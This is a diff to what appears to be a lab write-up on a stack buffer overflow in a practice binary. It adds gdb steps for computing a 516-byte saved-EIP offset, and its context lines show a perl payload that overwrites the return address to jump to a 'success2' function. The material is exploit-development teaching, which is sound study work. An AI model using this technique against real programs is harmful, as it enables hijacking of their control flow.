@@ -19,6 +19,26 @@ Author: Gabriel Maciá
 		   $1 = {int ()} 0x8049339 <success2>0x8049339
            
    - Find the position of the Saved EIP with gdb --> offset of 516 bytes
+		
+		* How to calculate the offset: 
+		offset = ebp - buffer + 4
+		
+		gdb> dissass callit  # see the index of the vulnerable function strcpy
+		
+			0x08049245 <+41>:    call   0x8049050 <strcpy@plt> 
+		
+		gdb> break *callit+41
+		gdb> run hello
+		gef➤  x/x $ebp
+			0xffffcdc8:     0xffffcde8
+		gef➤  x/x buffer
+			0xffffcbc8:     0x00000000
+   
+		gef➤  print /d 0xffffcdc8 - 0xffffcbc8 + 4
+			$5 = 516
+
+   
+   
    - Overflow the Saved EIP.
    
 	   ./vuln `perl -e 'print "A"x500 . "B"x16 . "\x39\x93\x04\x08"'`
